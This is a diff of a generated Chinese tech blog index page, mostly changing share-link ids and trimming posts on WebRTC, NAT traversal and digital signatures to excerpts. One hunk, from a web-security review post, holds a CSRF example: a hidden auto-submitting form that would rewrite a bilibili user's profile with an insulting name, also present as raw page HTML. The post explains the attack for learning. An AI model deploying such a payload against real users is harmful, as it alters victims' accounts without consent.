@@ -121,7 +121,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>或者偷偷修改了一些信息。（bilibili作了csrf防御，所以以下行为不会生效。）</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"autopost"</span> <span class="attr">display</span>=<span class="string">"none"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">name</span>=<span class="string">"transfer"</span>　<span class="attr">action</span>=<span class="string">"https://api.bilibili.com/x/member/web/update"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"uname"</span> <span class="attr">value</span>=<span class="string">"你们全家都是傻子"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"usersign"</span> <span class="attr">value</span>=<span class="string">"偷偷的来"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"保密"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"birthday"</span> <span class="attr">value</span>=<span class="string">"1900-1-1"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrf"</span> <span class="attr">value</span>=<span class="string">"024e772a01f7931072dd671808e2ff52"</span>&gt;</span></span><br><span class="line">　<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">	function postUpdate() &#123;</span></span><br><span class="line"><span class="undefined">		document.frames["autopost"].document.Submit("transfer");</span></span><br><span class="line"><span class="undefined">　&#125;</span></span><br><span class="line"><span class="undefined">　document.body.onload = postUpdate</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"autopost"</span> <span class="attr">display</span>=<span class="string">"none"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">name</span>=<span class="string">"transfer"</span>　<span class="attr">action</span>=<span class="string">"https://api.bilibili.com/x/member/web/update"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"uname"</span> <span class="attr">value</span>=<span class="string">"你们全家都是傻子"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"usersign"</span> <span class="attr">value</span>=<span class="string">"偷偷的来"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"保密"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"birthday"</span> <span class="attr">value</span>=<span class="string">"1900-1-1"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrf"</span> <span class="attr">value</span>=<span class="string">"024e772a01f7931072dd671808e2ff52"</span>&gt;</span></span><br><span class="line">　<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">	function postUpdate() &#123;</span></span><br><span class="line"><span class="undefined">		document.frames["autopost"].document.Submit("transfer");</span></span><br><span class="line"><span class="undefined">　&#125;</span></span><br><span class="line"><span class="undefined">　document.body.onload = postUpdate</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 </li>
 </ol>
 <p><iframe name="autopost" display="none"><br>    <form method="POST" name="transfer" 　action="https://api.bilibili.com/x/member/web/update"><br>        <input type="hidden" name="uname" value="你们全家都是傻子"><br>        <input type="hidden" name="usersign" value="偷偷的来"><br>        <input type="hidden" name="sex" value="保密"><br>        <input type="hidden" name="birthday" value="1900-1-1"><br>        <input type="hidden" name="csrf" value="44859482995b0e7dc27fc0cd8bf0196f"><br>　</form><br></iframe></p>
@@ -140,7 +140,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2019/01/25/复习--web安全基础/" data-id="cjrcv2r340039in3gbnbvgtl9" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2019/01/25/复习--web安全基础/" data-id="cjrcvav0e003fjb3g88buym5o" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -193,7 +193,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/10/21/webRTC基础篇--视频编解码基础/" data-id="cjrcv2r1t001bin3gpix7e3eq" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/10/21/webRTC基础篇--视频编解码基础/" data-id="cjrcvauyp001djb3gva9snwd7" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webRTC/">webRTC</a></li></ul>
@@ -238,36 +238,16 @@
 <li>两个浏览器通过SDP提供/应答机制，使用呼叫控制信令消息交换它们已发现的公共IP地址（ICE候选）；</li>
 <li>两个浏览器执行连接检查（ICE冲孔），确保P2P可以连接；</li>
 <li>建立连接后，RTC媒体会话和媒体交换就可以实现了。</li>
-<li>假如在一个高度限制的NAT或防火墙，这种直接的路径将无法建立，只能到达TURN服务器。结果是媒体通过TURN服务器分程传递。</li>
-</ol>
-<h3 id="STUN"><a href="#STUN" class="headerlink" title="STUN"></a>STUN</h3><p>STUN服务器是设立于公网的一台服务器，建立P2P的双方都可以直接访问到这台服务器。位于NAT网关后面的客户端A和B都可以与一台已知的集中服务器建立连接，并通过这台集中服务器了解对方的信息并中转各自的信息。</p>
-<blockquote>
-<p>注：STUN需要打开本地0~65535所有的udp端口，而TURN则可以选择一个udp端口段作为接收数据的端口。</p>
-</blockquote>
-<p>基本流程如下：</p>
-<ol>
-<li>A最初不知道如何向客户端B发起连接，于是A向集中服务器发送消息，请求集中服务器帮助建立与客户端B的UDP连接。</li>
-<li>集中服务器将含有B的外网和内网的地址二元组发给A，同时，集中服务器将包含有A的外网和内网的地址二元组信息的消息也发给B。这样一来， A与B就都知道对方外网和内网的地址二元组信息了。</li>
-<li>当A收到由集中服务器发来的包含B的外网和内网的地址二元组信息后， A开始向B的地址二元组发送UDP数据包，并且A会自动锁定第一个给出响应的B的地址二元组。同理，当B收到由集中服务器发来的A的外网和内网地址二元组信息后，也会开始向A的外网和内网的地址二元组发送UDP数据包，并且自动锁定第一个得到A回应的地址二元组。由于A与B互相向对方发送UDP数据包的操作是异步的，所以A和B发送数据包的时间先后并没有时序要求。</li>
-</ol>
-<p>简单的说就是 藏在 NAT之后的 A 和 B 互相者找不到对方，通过STUN服务器分别获取对方的信息之后再进行联接。如下图：<br><img src="http://www.52im.net/data/attachment/forum/201607/20/181200un7bn8y15vb8jb7k.png" alt="stun工作图示"></p>
-<h3 id="TURN"><a href="#TURN" class="headerlink" title="TURN"></a>TURN</h3><p>当p2p的一方或双方处于高度限制的NAT或者防火墙之后，如防火墙关闭了所有udp端口。STUN的方式就会失效。此时，就需要TURN出场。</p>
-<p>简单来说 TURN相当于一个中转服务器，A发给B的数据先发给TURN服务器，TURN服务器再转发给B。虽然TURN可以保证A和B双方的联接，但是，转发数据带开的巨大开销成本也是他的最大的缺陷。如下图。<br><img src="http://www.52im.net/data/attachment/forum/201607/20/181137oikgjgej2oigvskj.png" alt="turn 工作图标"></p>
-<h3 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h3><p>假设有如下两个设备A与B，A与B分别处于两个不用的NAT之后。</p>
-<blockquote>
-<p>客户端A——&gt;本地IP:10.0.0.1，本地端口:4321，外网IP:155.99.25.11，外网端口:62000<br>客户端B——&gt;本地IP:10.1.1.3，本地端口:4321，外网IP:138.76.29.7，外网端口:31000</p>
-</blockquote>
-<p>在A向服务器发送的登陆消息中，包含有A的内网地址二元组信息，即10.0.0.1:4321；服务器会记录下A的内网地址二元组信息，同时会把自己观察到的A的外网地址二元组信息记录下来。同理，服务器也会记录下B的内网地址二元组信息和由服务器观察到的客户端B的外网地址二元组信息。无论A与B二者中的任何一方向服务器发送P2P连接请求，服务器都会将其记录下来的上述的外网和内网地址二元组发送给A或B。</p>
-<p>A和B分属不同的内网，它们的内网地址在外网中是没有路由的，所以发往各自内网地址的UDP数据包会发送到错误的主机或者根本不存在的主机上。当A的第一个消息发往B的外网地址（如图3所示），该消息途经A的NAT设备，并在该设备上生成一个会话表项，该会话的源地址二元组信息是{10.0.0.1:4321}，和A与服务器建立连接的时候NAT生成的源地址二元组信息一样，但它的目的地址是B的外网地址。在A的NAT设备支持保留A的内网地址二元组信息的情况下，所有来自A的源地址二元组信息为{10.0.0.1:4321}的数据包都沿用A与集中服务器事先建立起来的会话，这些数据包的外网地址二元组信息均被映射为{155.99.25.11:62000}。</p>
-<p>A向B的外网地址发送消息的过程就是“打洞”的过程，从A的内网的角度来看应为从{10.0.0.1:4321}发往{138.76.29.7:31000}，从A在其NAT设备上建立的会话来看，是从{155.99.25.11:62000}发到{138.76.29.7:31000}。如果A发给B的外网地址二元组的消息包在B向A发送消息包之前到达B的NAT设备，B的NAT设备会认为A发过来的消息是未经授权的外网消息，并丢弃该数据包。</p>
-<p>B发往A的消息包也会在B的NAT设备上建立一个{10.1.1.3:4321，155.99.25.11:62000}的会话（通常也会沿用B与集中服务器连接时建立的会话，只是该会话现在不仅接受由服务器发给B的消息，还可以接受从A的NAT设备{155.99.25.11:6200}发来的消息）。</p>
-<p>一旦A与B都向对方的NAT设备在外网上的地址二元组发送了数据包，就打开了A与B之间的“洞”，A与B向对方的外网地址发送数据，等效为向对方的客户端直接发送UDP数据包了。一旦应用程序确认已经可以通过往对方的外网地址发送数据包的方式让数据包到达NAT后面的目的应用程序，程序会自动停止继续发送用于“打洞”的数据包，转而开始真正的P2P数据传输。</p>
-<p><a href="http://www.52im.net/thread-542-1-1.html" target="_blank" rel="noopener">参考：http://www.52im.net/thread-542-1-1.html</a></p>
-
+<li>假如在一个高度限制的NAT或防火墙，这种直接的路径将无法建立，只能到达TURN服务器。结果是媒体通过TURN服务器分程传递。
+        
+          <p class="article-more-link">
+            <a href="/2018/10/03/webRTC基础篇-ice/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/10/03/webRTC基础篇-ice/" data-id="cjrcv2r1w001ein3gnqjoeoil" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/10/03/webRTC基础篇-ice/" data-id="cjrcvauys001gjb3gbg20t15q" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webRTC/">webRTC</a></li></ul>
@@ -314,40 +294,16 @@
 <li>网络访问只能先由私网侧发起，公网无法主动访问私网主机； </li>
 <li>NAT网关在两个访问方向上完成两次地址的转换或翻译，出方向做源信息替换，入方向做目的信息替换； </li>
 <li>NAT网关的存在对通信双方是保持透明的； </li>
-<li>NAT网关为了实现双向翻译的功能，需要维护一张关联表，把会话的信息保存下来。</li>
-</ol>
-</blockquote>
-<h3 id="NAT端口映射方式"><a href="#NAT端口映射方式" class="headerlink" title="NAT端口映射方式"></a>NAT端口映射方式</h3><ol>
-<li><strong>全锥形NAT (Full Cone NAT)</strong><br><br>一旦内部主机端口对(iAddr:iPort)被NAT网关映射到(eAddr:ePort)，所有后续的(iAddr:iPort)报文都会被转换为(eAddr:ePort)；任何一个外部主机发送到(eAddr:ePort)的报文将会被转换后发到(iAddr:iPort)。</li>
-<li><strong>受限锥型NAT（Address-Restricted Cone NAT）</strong><br><br>一旦内部主机端口对(iAddr:iPort)被映射到(eAddr:ePort)，所有后续的(iAddr:iPort)报文都会被转换为(eAddr:ePort)；只有 (iAddr:iPort)向特定的外部主机hAddr发送过数据，主机hAddr从任意端口发送到(eAddr:ePort)的报文将会被转发到(iAddr:iPort)</li>
-<li><strong>端口受限型NAT（Port Restricted Cone NAT）</strong><br><br>一旦内部主机端口对(iAddr:iPort)被映射到(eAddr:ePort)，所有后续的(iAddr:iPort)报文都会被转换为(eAddr:ePort)；只有(iAddr:iPort)向特定的外部主机端口对(hAddr:hPort)发送过数据，由 (hAddr:hPort)发送到(eAddr:ePort)的报文将会被转发到(iAddr:iPort)</li>
-<li><strong>对称型NAT（Symmetric NAT）</strong><br><br>NAT网关会把内部主机“地址端口对”和外部主机“地址端口对”完全相同的报文看作一个连接，在网关上创建一个公网“地址端口对”映射进行转换，只有收到报文的外部主机从对应的端口对发送回应的报文，才能被转换。即使内部主机使用之前用过的地址端口对去连接不同外部主机(或端口)时，NAT网关也会建立新的映射关系。</li>
-</ol>
-<p>现实中的很多NAT设备是将这些转换方式混合在一起工作的，而不单单使用一种，所以这些术语只适合描述一种工作方式，而不是一个设备</p>
-<h3 id="NAT的弊端"><a href="#NAT的弊端" class="headerlink" title="NAT的弊端"></a>NAT的弊端</h3><p>NAT最大的弊端正在于此——破坏了IP端到端通信的能力。公网上的主机A无法主动向躲在NAT之后的内部主机B发送请求。此外，NAT工作机制依赖于修改IP包头的信息，这会妨碍一些安全协议的工作。因为NAT篡改了IP地址、传输层端口号和校验和，这会导致认证协议彻底不能工作，因为认证目的就是要保证这些信息在传输过程中没有变化。对于一些隧道协议，NAT的存在也导致了额外的问题，因为隧道协议通常用外层地址标识隧道实体，穿过NAT的隧道会有IP复用关系，在另一端需要小心处理。</p>
-<h3 id="NAT穿越技术"><a href="#NAT穿越技术" class="headerlink" title="NAT穿越技术"></a>NAT穿越技术</h3><p>为了解决IP端到端应用在NAT环境下遇到的问题，网络协议的设计者们创造了各种武器来进行应对。但遗憾的是，这里每一种方法都不完美，还需要在内部主机、应用程序或者NAT网关上增加额外的处理。</p>
-<ol>
-<li><strong>应用层网关</strong><br><br>应用层网关(ALG)是解决NAT对应用层协议无感知的一个最常用方法，已经被NAT设备厂商广泛采用，成为NAT设备的一个必需功能。因为NAT不感知应用协议，所以有必要额外为每个应用协议定制协议分析功能，这样NAT网关就能理解并支持特定的协议。</li>
-<li><strong>探针技术STUN和TURN</strong><br><br>所谓探针技术，是通过在所有参与通信的实体上安装探测插件，以检测网络中是否存在NAT网关，并对不同NAT模型实施不同穿越方法的一种技术。STUN服务器被部署在公网上，用于接收来自通信实体的探测请求，服务器会记录收到请求的报文地址和端口，并填写到回送的响应报文中。</li>
-<li><strong>中间件技术</strong><br><br>这也是一种通过开发通用方法解决NAT穿越问题的努力。与前者不同之处是，NAT网关是这一解决方案的参与者。与ALG的不同在于，客户端会参与网关公网映射信息的维护，此时NAT网关只要理解客户端的请求并按照要求去分配转换表，不需要自己去分析客户端的应用层数据。其中UPnP就是这样一种方法。</li>
-<li><strong>中继代理技术</strong><br><br>准确说它不是NAT穿越技术，而是NAT旁路技术。简单说，就是在NAT网关所在的位置旁边放置一个应用服务器，这个服务器在内部网络和外部公网分别有自己的网络连接。客户端特定的应用产生网络请求时，将定向发送到应用代理服务器。应用代理服务器根据代理协议解析客户端的请求，再从服务器的公网侧发起一个新的请求，把客户端请求的内容中继到外部网络上，返回的相应反方向中继。这项技术和ALG有很大的相似性，它要求为每个应用类型部署中继代理业务，中间服务器要理解这些请求。</li>
-<li><strong>特定协议的自穿越技术</strong><br><br>在所有方法中最复杂也最可靠的就是自己解决自己的问题。比如IKE和IPsec技术，在设计时就考虑了到如何穿越NAT的问题。因为这个协议是一个自加密的协议并且具有报文防修改的鉴别能力，其他通用方法爱莫能助。因为实际应用的NAT网关基本都是NAPT方式，所有通过传输层协议承载的报文可以顺利通过NAT。IKE和IPsec采用的方案就是用UDP在报文外面再加一层封装，而内部的报文就不再受到影响。IKE中还专门增加了NAT网关是否存在的检查能力以及绕开NAT网关检测IKE协议的方法。</li>
-</ol>
-<h3 id="NAT-的实现方式"><a href="#NAT-的实现方式" class="headerlink" title="NAT 的实现方式"></a>NAT 的实现方式</h3><ol>
-<li><strong>静态一对一地址映射</strong><br><br>NAT把一个私网地址和一个公网地址做静态关联，在从内而外的方向，将源IP匹配的私网IP替换为公网IP，反方向则将目的IP匹配公网IP的报文替换为私网IP。网络层以上的部分不进行替换处理，只修正校验和</li>
-<li><strong>静态多对多地址映射</strong><br><br>这种方式与上一种类似，只是把一段私网地址映射到一段公网地址。工作机制与前述的方式没有差别，只是简化配置工作量。</li>
-<li><strong>动态端口映射</strong><br><br>这是最基本的工作方式，将一段内网地址动态翻译为一个或多个公网IP，同时对传输层端口或其他上层协议信息进行转换，以实现IP复用。对由内而外的报文，替换源地址和端口，反向报文替换目的地址和端口。仅以连接公网的接口IP作为NAT转换的公网地址时，这种配置最简化，又被称为EasyIP。当以一段公网IP地址作为NAT转换地址时，需要配置一个地址池，NAT会自动在地址池中选择使用公网IP。</li>
-<li><strong>动态地址映射(no-pat)</strong><br><br>这是介于静态多对多地址映射和动态端口映射方式之间的一种工作机制。当有一个私网向公网侧访问到达NAT网关时，NAT网关会检查这个私网IP是否已经有关联的公网IP映射。如果已经存在，则按照转换表直接替换IP，不修改上层协议。如果不存在关联表项，则在空闲的公网IP池中占用一个IP，并写入关联表中，以后按照这个关联关系进行地址转换。当这个私网主机发起的所有对外访问均关闭或超时后，回收公网IP。这种方式可以理解为一组内网主机抢占式地共享一个公网IP地址池。当公网IP地址池用完以后，新连接将无法建立。</li>
-<li><strong>静态端口映射</strong><br><br>通过静态配置，把一个固定的私网IP地址和端口关联到一个公网地址和端口上。这种方式等同于前面介绍过的全锥模式，但是不需要内网主机首先发出报文。这种方式适用于在NAT网关上把一个知名服务（如HTTP）映射到一个内部主机上，也称为port forwarding。</li>
-<li><strong>应用层网关(ALG)</strong><br><br>在所有NAT产品实现中，ALG是一个必需的功能组件。但在不同实现中，有些产品可以动态加载不同的ALG模块，有些产品可以提供ALG开关控制，有些则不提供任何用户接口。ALG解析上层应用协议的内容，并且根据需要修改IP和端口相关信息，创建和维护附加的关联表项。</li>
-<li><strong>NAT转换关联表</strong><br><br>无论哪一种NAT工作方式，都要用到地址转换关联表，在不同产品的实现中，这个关联表的存储结构和在IP转发中调用的方式有很大不同。关联表中会记录源IP、目的IP、连接协议类型、传输层源端口、目的端口，以及转换后的源IP、源端口，目的IP、目的端口信息，这里的源和目的都是对应于从内网到外网的访问方向。依据NAT具体工作方式，这些信息可能全部填充，也可能部分填充。例如只按照IP做静态映射的方式，就不需要填入任何端口相关信息；对于静态端口映射，则只填入源相关的内容，而目的端的信息为空。</li>
-</ol>
-<p>参考：<a href="http://www.52im.net/thread-50-1-1.html" target="_blank" rel="noopener">http://www.52im.net/thread-50-1-1.html</a></p>
-
+<li>NAT网关为了实现双向翻译的功能，需要维护一张关联表，把会话的信息保存下来。
+        
+          <p class="article-more-link">
+            <a href="/2018/09/19/webRTC基础篇--NAT/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/09/19/webRTC基础篇--NAT/" data-id="cjrcv2r1r0017in3g6mnsvosk" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/09/19/webRTC基础篇--NAT/" data-id="cjrcvauyn0019jb3gz6fpx861" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webRTC/">webRTC</a></li></ul>
@@ -397,7 +353,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/09/01/webRTC基础--音视频/" data-id="cjrcv2r1q0014in3gy9g1vfzl" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/09/01/webRTC基础--音视频/" data-id="cjrcvauyl0016jb3g0biawjke" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webRTC/">webRTC</a></li></ul>
@@ -437,14 +393,16 @@
       
         <hr>
 <h3 id="数字签名是什么？"><a href="#数字签名是什么？" class="headerlink" title="数字签名是什么？"></a>数字签名是什么？</h3><p>作者：David Youd<br>翻译：阮一峰<br>阮老师地址：<a href="http://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html</a><br>原文网址：<a href="http://www.youdzone.com/signature.html" target="_blank" rel="noopener">http://www.youdzone.com/signature.html</a></p>
-<p>1.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080901.png" alt=""><br>鲍勃有两把钥匙，一把是公钥，另一把是私钥。<br>2.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080902.png" alt=""><br>鲍勃把公钥送给他的朋友们—-帕蒂、道格、苏珊—-每人一把。<br>3.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080903.png" alt=""><br>苏珊要给鲍勃写一封保密的信。她写完后用鲍勃的公钥加密，就可以达到保密的效果。</p>
-<p>4.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080904.png" alt=""><br>鲍勃收信后，用私钥解密，就看到了信件内容。这里要强调的是，只要鲍勃的私钥不泄露，这封信就是安全的，即使落在别人手里，也无法解密。</p>
-<p>5.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080905.png" alt=""><br>鲍勃给苏珊回信，决定采用”数字签名”。他写完后先用Hash函数，生成信件的摘要（digest）。<br>6.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080906.png" alt=""><br>然后，鲍勃使用私钥，对这个摘要加密，生成”数字签名”（signature）。<br>7.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080907.png" alt=""><br>鲍勃将这个签名，附在信件下面，一起发给苏珊。<br>8.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080908.png" alt=""><br>苏珊收信后，取下数字签名，用鲍勃的公钥解密，得到信件的摘要。由此证明，这封信确实是鲍勃发出的。<br>9.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080909.png" alt=""><br>苏珊再对信件本身使用Hash函数，将得到的结果，与上一步得到的摘要进行对比。如果两者一致，就证明这封信未被修改过。<br>10.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080910.png" alt=""><br>复杂的情况出现了。道格想欺骗苏珊，他偷偷使用了苏珊的电脑，用自己的公钥换走了鲍勃的公钥。此时，苏珊实际拥有的是道格的公钥，但是还以为这是鲍勃的公钥。因此，道格就可以冒充鲍勃，用自己的私钥做成”数字签名”，写信给苏珊，让苏珊用假的鲍勃公钥进行解密。<br>11.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080911.png" alt=""><br>后来，苏珊感觉不对劲，发现自己无法确定公钥是否真的属于鲍勃。她想到了一个办法，要求鲍勃去找”证书中心”（certificate authority，简称CA），为公钥做认证。证书中心用自己的私钥，对鲍勃的公钥和一些相关信息一起加密，生成”数字证书”（Digital Certificate）。<br>12.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080912.png" alt=""><br>鲍勃拿到数字证书以后，就可以放心了。以后再给苏珊写信，只要在签名的同时，再附上数字证书就行了。<br>13.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080913.png" alt=""><br>苏珊收信后，用CA的公钥解开数字证书，就可以拿到鲍勃真实的公钥了，然后就能证明”数字签名”是否真的是鲍勃签的。<br>14.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080914.jpg" alt=""><br>下面，我们看一个应用”数字证书”的实例：https协议。这个协议主要用于网页加密。<br>15.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080915.png" alt=""><br>首先，客户端向服务器发出加密请求。<br>16.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080916.png" alt=""><br>服务器用自己的私钥加密网页以后，连同本身的数字证书，一起发送给客户端。<br>17.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080917.png" alt=""><br>客户端（浏览器）的”证书管理器”，有”受信任的根证书颁发机构”列表。客户端会根据这张列表，查看解开数字证书的公钥是否在列表之内。<br>18.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080918.png" alt=""><br>如果数字证书记载的网址，与你正在浏览的网址不一致，就说明这张证书可能被冒用，浏览器会发出警告。<br>19.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080919.jpg" alt=""><br>如果这张数字证书不是由受信任的机构颁发的，浏览器会发出另一种警告。<br>20.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080920.png" alt=""><br>如果数字证书是可靠的，客户端就可以使用证书中的服务器公钥，对信息进行加密，然后与服务器交换加密信息。</p>
-
+<p>1.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080901.png" alt=""><br>鲍勃有两把钥匙，一把是公钥，另一把是私钥。<br>2.<br><img src="http://www.ruanyifeng.com/blogimg/asset/201108/bg2011080902.png" alt=""><br>鲍勃把公钥送给他的朋友们—-帕蒂、道格、苏珊—-每人一把。<br>
+        
+          <p class="article-more-link">
+            <a href="/2018/05/01/【转】阮一峰：数字签名是什么？/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/05/01/【转】阮一峰：数字签名是什么？/" data-id="cjrcv2r22001hin3g9aggbzop" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/05/01/【转】阮一峰：数字签名是什么？/" data-id="cjrcvauyv001jjb3g0nv6evd3" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/前端/">前端</a></li></ul>
@@ -504,7 +462,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/03/31/前端优化-渲染优化四-管道-合成/" data-id="cjrcv2r2u002pin3gmotr7bnv" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/03/31/前端优化-渲染优化四-管道-合成/" data-id="cjrcvauzr002rjb3gzvldulf2" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/composite/">composite</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/前端优化/">前端优化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渲染/">渲染</a></li></ul>
@@ -552,7 +510,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/03/31/前端优化-渲染优化三-管道-css/" data-id="cjrcv2r2r002iin3gcriqg9bl" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/03/31/前端优化-渲染优化三-管道-css/" data-id="cjrcvauzn002kjb3gtim9hmwt" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/css/">css</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/前端优化/">前端优化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渲染/">渲染</a></li></ul>
@@ -600,7 +558,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/03/31/前端优化-渲染优化二-管道-javascript/" data-id="cjrcv2r2s002lin3gmv2dva4y" class="article-share-link">Teilen</a>
